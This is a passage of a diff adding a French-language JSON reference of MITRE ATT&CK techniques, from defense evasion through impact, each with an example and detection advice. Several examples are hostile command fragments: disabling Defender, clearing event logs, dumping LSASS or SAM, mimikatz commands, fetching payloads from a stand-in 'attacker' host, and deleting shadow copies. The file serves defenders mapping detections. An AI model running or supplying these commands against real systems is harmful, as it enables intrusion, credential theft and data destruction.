+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS"
+        ],
+        "example": "Activité malveillante avec compte 'svc_backup' pour paraître légitime.",
+        "detection": "Comportement atypique même pour un compte légitime (UBA/UEBA).",
+        "url": "https://attack.mitre.org/techniques/T1078/",
+        "sub_techniques": [
+          {
+            "id": "T1078.003",
+            "name": "Local Accounts",
+            "description": "Compte local valide.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Compte local admin utilisé pour PsExec.",
+            "detection": "Sysmon + UBA baseline.",
+            "url": "https://attack.mitre.org/techniques/T1078/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "description": "Chiffrement, encodage, packing d'un payload.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Beacon Cobalt Strike packé avec UPX + AES.",
+        "detection": "YARA, AMSI, entropy analysis, sandbox.",
+        "url": "https://attack.mitre.org/techniques/T1027/",
+        "sub_techniques": [
+          {
+            "id": "T1027.001",
+            "name": "Binary Padding",
+            "description": "Ajout de bytes pour changer la signature.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Pad du binaire avec random bytes.",
+            "detection": "Entropy analysis.",
+            "url": "https://attack.mitre.org/techniques/T1027/001/"
+          },
+          {
+            "id": "T1027.004",
+            "name": "Compile After Delivery",
+            "description": "Compilation à la volée.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "csc.exe compile d'un payload.",
+            "detection": "EDR compiler monitoring.",
+            "url": "https://attack.mitre.org/techniques/T1027/004/"
+          },
+          {
+            "id": "T1027.010",
+            "name": "Command Obfuscation",
+            "description": "Obfuscation de commandes.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "$a='cer'+'tutil'; & $a -urlcache -split ...",
+            "detection": "EDR command-line decoding.",
+            "url": "https://attack.mitre.org/techniques/T1027/010/"
+          }
+        ]
+      },
+      {
+        "id": "T1562",
+        "name": "Impair Defenses",
+        "description": "Désactivation ou modification des outils de défense.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS",
+          "Containers"
+        ],
+        "example": "Set-MpPreference -DisableRealtimeMonitoring $true.",
+        "detection": "Tamper protection alerts, Event 4688 sur Disable*.",
+        "url": "https://attack.mitre.org/techniques/T1562/",
+        "sub_techniques": [
+          {
+            "id": "T1562.001",
+            "name": "Disable or Modify Tools",
+            "description": "Désactivation d'outils.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "net stop WinDefend + sc delete.",
+            "detection": "Event 4688 + service monitoring.",
+            "url": "https://attack.mitre.org/techniques/T1562/001/"
+          },
+          {
+            "id": "T1562.002",
+            "name": "Disable Windows Event Logging",
+            "description": "Arrêt d'event log Windows.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "wevtutil cl Security ou DisableLog.",
+            "detection": "Event log gap + Event 1102.",
+            "url": "https://attack.mitre.org/techniques/T1562/002/"
+          },
+          {
+            "id": "T1562.003",
+            "name": "Impair Command History Logging",
+            "description": "Désactivation history shell.",
+            "platforms": [
+              "Linux",
+              "macOS"
+            ],
+            "example": "unset HISTFILE / ln -s /dev/null ~/.bash_history.",
+            "detection": "Audit env + history file absence.",
+            "url": "https://attack.mitre.org/techniques/T1562/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1055",
+        "name": "Process Injection",
+        "description": "Injection de code dans un processus vivant.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Classic DLL injection dans explorer.exe.",
+        "detection": "Sysmon 8, ETW, EDR memory scan.",
+        "url": "https://attack.mitre.org/techniques/T1055/",
+        "sub_techniques": [
+          {
+            "id": "T1055.001",
+            "name": "Dynamic-link Library Injection",
+            "description": "DLL Injection classique.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "LoadLibrary dans processus cible.",
+            "detection": "Sysmon 8 + module load from disk.",
+            "url": "https://attack.mitre.org/techniques/T1055/001/"
+          },
+          {
+            "id": "T1055.002",
+            "name": "Portable Executable Injection",
+            "description": "Injection de PE.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Mapping de payload.exe dans process.",
+            "detection": "EDR memory guard.",
+            "url": "https://attack.mitre.org/techniques/T1055/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1218",
+        "name": "System Binary Proxy Execution",
+        "description": "Abus de binaires signés Microsoft (LOLBAS).",
+        "platforms": [
+          "Windows"
+        ],
+        "example": "rundll32.exe shell32.dll,Control_RunDLL payload.dll.",
+        "detection": "Sysmon 1 sur signed Microsoft binaries avec arguments suspects.",
+        "url": "https://attack.mitre.org/techniques/T1218/",
+        "sub_techniques": [
+          {
+            "id": "T1218.011",
+            "name": "Rundll32",
+            "description": "rundll32.exe abuse.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "rundll32.exe url.dll,OpenURL calc.exe.",
+            "detection": "Sysmon 1 + LOLBAS monitoring.",
+            "url": "https://attack.mitre.org/techniques/T1218/011/"
+          },
+          {
+            "id": "T1218.010",
+            "name": "Regsvr32",
+            "description": "regsvr32.exe abuse (Squiblydoo).",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "regsvr32 /s /n /u /i:http://x.sct scrobj.dll.",
+            "detection": "Sysmon 1 + network egress sur LOLBAS.",
+            "url": "https://attack.mitre.org/techniques/T1218/010/"
+          }
+        ]
+      },
+      {
+        "id": "T1112",
+        "name": "Modify Registry",
+        "description": "Modification du registre Windows.",
+        "platforms": [
+          "Windows"
+        ],
+        "example": "Set-ItemProperty -Path HKLM:\\...\\WindowsDefender -Name DisableAntiSpyware 1.",
+        "detection": "Sysmon 13, Event 4657, baselines registre.",
+        "url": "https://attack.mitre.org/techniques/T1112/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0006",
+    "tactic_name": "Credential Access",
+    "tactic_desc": "L'adversaire vole des identifiants (comptes, mots de passe, tokens).",
+    "techniques": [
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "description": "Extraction de credentials (LSASS, SAM, NTDS, secrets).",
+        "platforms": [
+          "Windows"
+        ],
+        "example": "mimikatz sekurlsa::logonpasswords ou comsvcs.dll + MiniDump.",
+        "detection": "Sysmon 10, EDR LSASS handle, Event 4663 sur lsass.",
+        "url": "https://attack.mitre.org/techniques/T1003/",
+        "sub_techniques": [
+          {
+            "id": "T1003.001",
+            "name": "LSASS Memory",
+            "description": "Dump LSASS.exe.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "comsvcs.dll MiniDump sur lsass PID.",
+            "detection": "Sysmon 10 + handle to lsass.",
+            "url": "https://attack.mitre.org/techniques/T1003/001/"
+          },
+          {
+            "id": "T1003.002",
+            "name": "Security Account Manager",
+            "description": "Extraction SAM.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "reg save hklm\\sam sam.hive.",
+            "detection": "Sysmon 1 sur reg.exe.",
+            "url": "https://attack.mitre.org/techniques/T1003/002/"
+          },
+          {
+            "id": "T1003.003",
+            "name": "NTDS",
+            "description": "Extraction NTDS.dit.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "ntdsutil + volume shadow copy.",
+            "detection": "VSS creation + ntdsutil exec.",
+            "url": "https://attack.mitre.org/techniques/T1003/003/"
+          },
+          {
+            "id": "T1003.006",
+            "name": "DCSync",
+            "description": "Réplication AD forcée.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "mimikatz lsadump::dcsync.",
+            "detection": "Event 4662 anomalies.",
+            "url": "https://attack.mitre.org/techniques/T1003/006/"
+          }
+        ]
+      },
+      {
+        "id": "T1110",
+        "name": "Brute Force",
+        "description": "Tentatives répétées (brute force, spraying, stuffing).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS",
+          "SaaS",
+          "Network",
+          "Containers"
+        ],
+        "example": "Hydra SSH sur utilisateurs valides.",
+        "detection": "Event 4625 répétés, lockouts, IP reputation.",
+        "url": "https://attack.mitre.org/techniques/T1110/",
+        "sub_techniques": [
+          {
+            "id": "T1110.001",
+            "name": "Password Guessing",
+            "description": "Brute force simple.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS",
+              "SaaS"
+            ],
+            "example": "Hydra / crackmapexec.",
+            "detection": "Volume 4625, MFA challenge.",
+            "url": "https://attack.mitre.org/techniques/T1110/001/"
+          },
+          {
+            "id": "T1110.003",
+            "name": "Password Spraying",
+            "description": "Un mot de passe sur plusieurs comptes.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS",
+              "SaaS"
+            ],
+            "example": "1 password × 1000 users Azure AD.",
+            "detection": "Pattern low-and-slow.",
+            "url": "https://attack.mitre.org/techniques/T1110/003/"
+          },
+          {
+            "id": "T1110.004",
+            "name": "Credential Stuffing",
+            "description": "Couples user:password leakés.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS",
+              "SaaS"
+            ],
+            "example": "Automation M365 + combo lists.",
+            "detection": "Anomalie login post-breach.",
+            "url": "https://attack.mitre.org/techniques/T1110/004/"
+          }
+        ]
+      },
+      {
+        "id": "T1555",
+        "name": "Credentials from Password Stores",
+        "description": "Extraction depuis stores (navigateurs, KeePass, keychains).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Vol de Chrome Login Data + decryption via DPAPI.",
+        "detection": "File access sur databases sensibles, EDR.",
+        "url": "https://attack.mitre.org/techniques/T1555/"
+      },
+      {
+        "id": "T1558",
+        "name": "Steal or Forge Kerberos Tickets",
+        "description": "Kerberoasting, golden/silver ticket.",
+        "platforms": [
+          "Windows"
+        ],
+        "example": "GetUserSPNs.py + hashcat offline.",
+        "detection": "Event 4769 (TGS) avec cipher faible.",
+        "url": "https://attack.mitre.org/techniques/T1558/",
+        "sub_techniques": [
+          {
+            "id": "T1558.003",
+            "name": "Kerberoasting",
+            "description": "Demande de TGS service accounts.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Rubeus kerberoast.",
+            "detection": "Event 4769 RC4 tickets.",
+            "url": "https://attack.mitre.org/techniques/T1558/003/"
+          },
+          {
+            "id": "T1558.001",
+            "name": "Golden Ticket",
+            "description": "Forge de TGT krbtgt.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "mimikatz kerberos::golden.",
+            "detection": "Event 4769 lifetime anormal.",
+            "url": "https://attack.mitre.org/techniques/T1558/001/"
+          }
+        ]
+      },
+      {
+        "id": "T1056",
+        "name": "Input Capture",
+        "description": "Capture des frappes clavier.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Keylogger hooking SetWindowsHookEx.",
+        "detection": "Hook detection, EDR user-mode.",
+        "url": "https://attack.mitre.org/techniques/T1056/",
+        "sub_techniques": [
+          {
+            "id": "T1056.001",
+            "name": "Keylogging",
+            "description": "Capture frappes.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Hook API + buffer send C2.",
+            "detection": "SetWindowsHookEx monitoring.",
+            "url": "https://attack.mitre.org/techniques/T1056/001/"
+          }
+        ]
+      },
+      {
+        "id": "T1606",
+        "name": "Forge Web Credentials",
+        "description": "Forge de cookies / tokens web (M365, SAML).",
+        "platforms": [
+          "Windows",
+          "IaaS",
+          "SaaS"
+        ],
+        "example": "Golden SAML via AD FS token signing cert.",
+        "detection": "ADFS audit logs, anomalous token signing.",
+        "url": "https://attack.mitre.org/techniques/T1606/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0007",
+    "tactic_name": "Discovery",
+    "tactic_desc": "L'adversaire explore l'environnement.",
+    "techniques": [
+      {
+        "id": "T1087",
+        "name": "Account Discovery",
+        "description": "Énumération de comptes (local, domaine, cloud).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS"
+        ],
+        "example": "net user /domain, Get-ADUser, AzureAD MSOL.",
+        "detection": "Event 4661 sur directory, 4662, M365 audit.",
+        "url": "https://attack.mitre.org/techniques/T1087/",
+        "sub_techniques": [
+          {
+            "id": "T1087.002",
+            "name": "Domain Account",
+            "description": "Découverte comptes AD.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "net user /domain + Get-ADUser -Filter *.",
+            "detection": "Event 4662 + SPN scan.",
+            "url": "https://attack.mitre.org/techniques/T1087/002/"
+          },
+          {
+            "id": "T1087.004",
+            "name": "Email Account",
+            "description": "Découverte comptes mail.",
+            "platforms": [
+              "SaaS",
+              "Office Suite"
+            ],
+            "example": "Mailbox enumeration via Get-Mailbox.",
+            "detection": "M365 audit Mailbox Search.",
+            "url": "https://attack.mitre.org/techniques/T1087/004/"
+          },
+          {
+            "id": "T1087.005",
+            "name": "Cloud Account",
+            "description": "Découverte comptes cloud.",
+            "platforms": [
+              "IaaS",
+              "SaaS"
+            ],
+            "example": "ListUsers AzureAD / Get-IAMUsers.",
+            "detection": "CloudTrail List/Get IAM.",
+            "url": "https://attack.mitre.org/techniques/T1087/005/"
+          }
+        ]
+      },
+      {
+        "id": "T1083",
+        "name": "File and Directory Discovery",
+        "description": "Recherche de fichiers/dossiers d'intérêt.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "dir /s C:\\Users ou find / -name '*.docx'.",
+        "detection": "Sysmon 11, audit 4663, baseline filesystem.",
+        "url": "https://attack.mitre.org/techniques/T1083/"
+      },
+      {
+        "id": "T1057",
+        "name": "Process Discovery",
+        "description": "Énumération des processus en cours.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "tasklist /v + recherche AV/EDR.",
+        "detection": "Event 4688, Sysmon 1, command-line monitoring.",
+        "url": "https://attack.mitre.org/techniques/T1057/"
+      },
+      {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "description": "Collecte d'infos système (OS, hostname).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "systeminfo, uname -a, hostnamectl.",
+        "detection": "Event 1 + commands telemetry.",
+        "url": "https://attack.mitre.org/techniques/T1082/"
+      },
+      {
+        "id": "T1049",
+        "name": "System Network Connections Discovery",
+        "description": "Découverte des connexions réseau.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "netstat -anob + net use.",
+        "detection": "Event 1 + netstat exec.",
+        "url": "https://attack.mitre.org/techniques/T1049/"
+      },
+      {
+        "id": "T1007",
+        "name": "System Service Discovery",
+        "description": "Énumération de services.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "sc query ou systemctl list-units.",
+        "detection": "Event 4688 + service query events.",
+        "url": "https://attack.mitre.org/techniques/T1007/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0008",
+    "tactic_name": "Lateral Movement",
+    "tactic_desc": "L'adversaire se déplace latéralement dans le réseau.",
+    "techniques": [
+      {
+        "id": "T1021",
+        "name": "Remote Services",
+        "description": "Utilisation de services distants (RDP, SMB, SSH, WinRM).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "PsExec sur SRV01, WMI exec via WinRM.",
+        "detection": "Event 4624 type 3/10, 4674, WMI activity.",
+        "url": "https://attack.mitre.org/techniques/T1021/",
+        "sub_techniques": [
+          {
+            "id": "T1021.002",
+            "name": "SMB/Windows Admin Shares",
+            "description": "C$ / ADMIN$ partage.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "net use \\\\SRV01\\C$ puis PsExec.",
+            "detection": "Event 5140 + 4624 type 3.",
+            "url": "https://attack.mitre.org/techniques/T1021/002/"
+          },
+          {
+            "id": "T1021.006",
+            "name": "Windows Remote Management",
+            "description": "WinRM exec.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Invoke-Command -ComputerName SRV01.",
+            "detection": "Event 91 WinRM + 4624 type 3.",
+            "url": "https://attack.mitre.org/techniques/T1021/006/"
+          },
+          {
+            "id": "T1021.004",
+            "name": "SSH",
+            "description": "SSH abuse.",
+            "platforms": [
+              "Linux",
+              "macOS"
+            ],
+            "example": "ssh user@host + agent forward.",
+            "detection": "Auth log + agent forwarding.",
+            "url": "https://attack.mitre.org/techniques/T1021/004/"
+          }
+        ]
+      },
+      {
+        "id": "T1570",
+        "name": "Lateral Tool Transfer",
+        "description": "Transfert d'outils latéralement (SMB, HTTP, scp).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "copie de Mimikatz via SMB + atexec.",
+        "detection": "Sysmon 11 file write remote, FIM.",
+        "url": "https://attack.mitre.org/techniques/T1570/"
+      },
+      {
+        "id": "T1080",
+        "name": "Taint Shared Content",
+        "description": "Compromission de contenu partagé (lecteurs réseau).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Drop de shortcut.lnk malveillant dans SYSVOL.",
+        "detection": "FIM + GPO monitoring.",
+        "url": "https://attack.mitre.org/techniques/T1080/"
+      },
+      {
+        "id": "T1550",
+        "name": "Use Alternate Authentication Material",
+        "description": "Pass-the-hash, pass-the-ticket, application token.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS"
+        ],
+        "example": "PtH via sekurlsa::pth + WMI exec.",
+        "detection": "Event 4624 type 9 anomalies, EDR LSASS hooks.",
+        "url": "https://attack.mitre.org/techniques/T1550/",
+        "sub_techniques": [
+          {
+            "id": "T1550.003",
+            "name": "Pass the Ticket",
+            "description": "Ticket Kerberos réutilisé.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "mimikatz kerberos::ptt.",
+            "detection": "Event 4769 anomalies.",
+            "url": "https://attack.mitre.org/techniques/T1550/003/"
+          },
+          {
+            "id": "T1550.001",
+            "name": "Application Access Token",
+            "description": "Token OAuth/SaaS volé.",
+            "platforms": [
+              "SaaS",
+              "IaaS"
+            ],
+            "example": "Token copier dans cookie pour réutilisation.",
+            "detection": "Token replay detection.",
+            "url": "https://attack.mitre.org/techniques/T1550/001/"
+          }
+        ]
+      },
+      {
+        "id": "T1534",
+        "name": "Internal Spearphishing",
+        "description": "Phishing interne depuis compte compromis.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS"
+        ],
+        "example": "Envoi d'un faux invoice depuis finance@.",
+        "detection": "Mail flow anomaly, header spoof, DMARC failure.",
+        "url": "https://attack.mitre.org/techniques/T1534/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0009",
+    "tactic_name": "Collection",
+    "tactic_desc": "L'adversaire collecte des données sensibles.",
+    "techniques": [
+      {
+        "id": "T1560",
+        "name": "Archive Collected Data",
+        "description": "Archivage (zip, rar) avant exfiltration.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "7z a data.7z *.docx *.xlsx avec mot de passe.",
+        "detection": "Process lineage, DLP.",
+        "url": "https://attack.mitre.org/techniques/T1560/",
+        "sub_techniques": [
+          {
+            "id": "T1560.001",
+            "name": "Archive via Utility",
+            "description": "zip/7z/rar.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Compress via 7z de tout Users/*.",
+            "detection": "DLP, archive tool command-lines.",
+            "url": "https://attack.mitre.org/techniques/T1560/001/"
+          }
+        ]
+      },
+      {
+        "id": "T1005",
+        "name": "Data from Local System",
+        "description": "Collecte de données locales (fichiers sensibles).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Recherche de *.pdf, *.kdbx sur postes ciblés.",
+        "detection": "DLP file access, FIM, sensitive data tagging.",
+        "url": "https://attack.mitre.org/techniques/T1005/"
+      },
+      {
+        "id": "T1114",
+        "name": "Email Collection",
+        "description": "Collecte de mails (local ou remote).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "Office Suite",
+          "SaaS"
+        ],
+        "example": "Mails export via M365 eDiscovery.",
+        "detection": "M365 audit MailItemsAccessed.",
+        "url": "https://attack.mitre.org/techniques/T1114/",
+        "sub_techniques": [
+          {
+            "id": "T1114.001",
+            "name": "Local Email Collection",
+            "description": "PST/OST copy.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Copie locale de fichiers Outlook.",
+            "detection": "FIM + PST/OST access.",
+            "url": "https://attack.mitre.org/techniques/T1114/001/"
+          },
+          {
+            "id": "T1114.003",
+            "name": "Email Forwarding Rule",
+            "description": "Forwarding rule.",
+            "platforms": [
+              "SaaS",
+              "Office Suite"
+            ],
+            "example": "Inbox rule forwarding to external.",
+            "detection": "M365 InboxRule audit.",
+            "url": "https://attack.mitre.org/techniques/T1114/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1530",
+        "name": "Data from Cloud Storage Object",
+        "description": "Collecte depuis stockage cloud (S3, Azure Blob).",
+        "platforms": [
+          "IaaS",
+          "SaaS"
+        ],
+        "example": "Récupération massive de buckets S3 mal configurés.",
+        "detection": "CloudTrail GetObject anomalies.",
+        "url": "https://attack.mitre.org/techniques/T1530/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0011",
+    "tactic_name": "Command and Control",
+    "tactic_desc": "L'adversaire communique avec ses implants.",
+    "techniques": [
+      {
+        "id": "T1071",
+        "name": "Application Layer Protocol",
+        "description": "C&C via protocoles applicatifs (HTTP/S, DNS, SMTP).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS",
+          "SaaS"
+        ],
+        "example": "Cobalt Strike beacon via HTTPS sur domaine CDN.",
+        "detection": "JA3/JA3S fingerprint, beaconing pattern, DNS entropy.",
+        "url": "https://attack.mitre.org/techniques/T1071/",
+        "sub_techniques": [
+          {
+            "id": "T1071.001",
+            "name": "Web Protocols",
+            "description": "HTTP/HTTPS C&C.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "HTTPS POST beacon over port 443.",
+            "detection": "JA3 + beaconing.",
+            "url": "https://attack.mitre.org/techniques/T1071/001/"
+          },
+          {
+            "id": "T1071.002",
+            "name": "File Transfer Protocols",
+            "description": "FTP/SMB C&C.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Beacon over SMB named pipe.",
+            "detection": "Sysmon 17/18 named pipe events.",
+            "url": "https://attack.mitre.org/techniques/T1071/002/"
+          },
+          {
+            "id": "T1071.004",
+            "name": "DNS",
+            "description": "DNS tunneling C&C.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "TXT record queries to attacker domain.",
+            "detection": "DNS entropy, length anomalies.",
+            "url": "https://attack.mitre.org/techniques/T1071/004/"
+          }
+        ]
+      },
+      {
+        "id": "T1090",
+        "name": "Proxy",
+        "description": "Proxys pour masquer la source du C&C.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS",
+          "SaaS"
+        ],
+        "example": "Multi-hop proxy via VPS compromis.",
+        "detection": "Proxy chain detection, traffic relays.",
+        "url": "https://attack.mitre.org/techniques/T1090/",
+        "sub_techniques": [
+          {
+            "id": "T1090.001",
+            "name": "Internal Proxy",
+            "description": "Proxy interne.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "SOCKS via compromised host.",
+            "detection": "Outbound proxy monitoring.",
+            "url": "https://attack.mitre.org/techniques/T1090/001/"
+          },
+          {
+            "id": "T1090.002",
+            "name": "External Proxy",
+            "description": "Proxy externe (Tor, open proxy).",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Cobalt Strike via Tor exit nodes.",
+            "detection": "Tor exit list + reputation.",
+            "url": "https://attack.mitre.org/techniques/T1090/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1095",
+        "name": "Non-Application Layer Protocol",
+        "description": "C&C via raw TCP, ICMP.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "Beacon ICMP exfil via data field.",
+        "detection": "ICMP payload anomalies, IDS.",
+        "url": "https://attack.mitre.org/techniques/T1095/"
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "description": "Transfert d'outils depuis l'extérieur (download).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS",
+          "SaaS"
+        ],
+        "example": "curl http://attacker/stage2.exe + exec.",
+        "detection": "Egress monitoring, TLS interception.",
+        "url": "https://attack.mitre.org/techniques/T1105/"
+      },
+      {
+        "id": "T1572",
+        "name": "Protocol Tunneling",
+        "description": "Encapsulation (DNS over HTTPS, ICMP tunnel).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "dnscat2 pour tunnel C&C via DNS.",
+        "detection": "DNS query rate, entropy, response size.",
+        "url": "https://attack.mitre.org/techniques/T1572/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0010",
+    "tactic_name": "Exfiltration",
+    "tactic_desc": "L'adversaire exfiltre des données hors du réseau.",
+    "techniques": [
+      {
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "description": "Exfiltration via le canal C&C établi.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "Beacon Cobalt Strike SMB → exfil HTTP.",
+        "detection": "Outbound traffic anomaly.",
+        "url": "https://attack.mitre.org/techniques/T1041/"
+      },
+      {
+        "id": "T1567",
+        "name": "Exfiltration Over Web Service",
+        "description": "Exfiltration via service web légitime (Mega, Dropbox, Pastebin).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS"
+        ],
+        "example": "Upload sur Mega.nz via API.",
+        "detection": "Egress DLP, CASB, anomalous large uploads.",
+        "url": "https://attack.mitre.org/techniques/T1567/",
+        "sub_techniques": [
+          {
+            "id": "T1567.002",
+            "name": "Exfiltration to Cloud Storage",
+            "description": "Vers S3/Azure Blob.",
+            "platforms": [
+              "IaaS",
+              "SaaS"
+            ],
+            "example": "PUT S3 depuis poste compromis.",
+            "detection": "CASB + cloud storage anomaly.",
+            "url": "https://attack.mitre.org/techniques/T1567/002/"
+          },
+          {
+            "id": "T1567.003",
+            "name": "Exfiltration to Code Repository",
+            "description": "Vers GitHub/GitLab.",
+            "platforms": [
+              "SaaS"
+            ],
+            "example": "git push d'un repo privé externe.",
+            "detection": "Outbound git traffic detection.",
+            "url": "https://attack.mitre.org/techniques/T1567/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1052",
+        "name": "Exfiltration Over Physical Medium",
+        "description": "Exfiltration via support physique (USB).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Copie de fichiers sur USB autorisé puis exfiltration.",
+        "detection": "DLP USB, removable storage audit.",
+        "url": "https://attack.mitre.org/techniques/T1052/"
+      },
+      {
+        "id": "T1029",
+        "name": "Scheduled Transfer",
+        "description": "Transferts programmés low-and-slow.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Beacon quotidien à 03h00 avec tranche de data.",
+        "detection": "Long tail traffic, periodic outbound.",
+        "url": "https://attack.mitre.org/techniques/T1029/"
+      },
+      {
+        "id": "T1537",
+        "name": "Transfer Data to Cloud Account",
+        "description": "Transfert vers compte cloud contrôlé par l'attaquant.",
+        "platforms": [
+          "IaaS",
+          "SaaS"
+        ],
+        "example": "Sync de données vers Azure Blob sous contrôle attaquant.",
+        "detection": "CASB anomaly, anomalous tenant.",
+        "url": "https://attack.mitre.org/techniques/T1537/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0040",
+    "tactic_name": "Impact",
+    "tactic_desc": "L'adversaire dégrade, interrompt ou détruit systèmes et données.",
+    "techniques": [
+      {
+        "id": "T1486",
+        "name": "Data Encrypted for Impact",
+        "description": "Chiffrement de données dans un but destructif (ransomware).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "WannaCry chiffre les fichiers utilisateurs.",
+        "detection": "Modifications massives de fichiers (MFT,shadow), ransom note, EDR.",
+        "url": "https://attack.mitre.org/techniques/T1486/"
+      },
+      {
+        "id": "T1485",
+        "name": "Data Destruction",
+        "description": "Destruction de données (wipe, overwrite).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "sdelete -p 5 -s -q sur volumes.",
+        "detection": "Volume shadow deletion, FIM sur destructions.",
+        "url": "https://attack.mitre.org/techniques/T1485/"
+      },
+      {
+        "id": "T1490",
+        "name": "Inhibit System Recovery",
+        "description": "Inhibition de la récupération système (shadow copies, backups).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "vssadmin delete shadows /all /quiet.",
+        "detection": "vssadmin exec, wbadmin delete, backup tampering.",
+        "url": "https://attack.mitre.org/techniques/T1490/"
+      },
+      {
+        "id": "T1489",
+        "name": "Service Stop",
+        "description": "Arrêt ou désactivation de services critiques.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "net stop MSSQLSERVER pour sabotage.",
+        "detection": "Event 7036, sudden service stop.",
+        "url": "https://attack.mitre.org/techniques/T1489/"
+      },
+      {
+        "id": "T1499",
+        "name": "Endpoint Denial of Service",
+        "description": "DoS endpoint (crash applicatif, browser).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS"
+        ],
+        "example": "Browserkill.js flooding tabs.",
+        "detection": "EDR browser kill detection.",
